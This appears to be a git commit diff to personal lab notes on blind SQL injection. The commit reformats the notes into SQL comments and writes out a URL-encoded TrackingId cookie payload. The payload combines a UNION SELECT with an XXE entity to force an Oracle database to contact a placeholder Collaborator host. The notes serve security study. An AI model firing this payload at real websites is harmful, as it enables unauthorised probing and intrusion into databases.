661437ca656096a301b91c32a00466c0efffe104
HTN <96134288+htn-dev@users.noreply.github.com>
2022-05-25 20:25:22 -0400

    Update out-of-band interaction.sql

--- Blind SQL injection/out-of-band interaction.sql
+++ Blind SQL injection/out-of-band interaction.sql
@@ -3,7 +3,8 @@
 
 --Exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
 
-    Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
+--Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
 
-    Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
-    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+--Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
+    
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
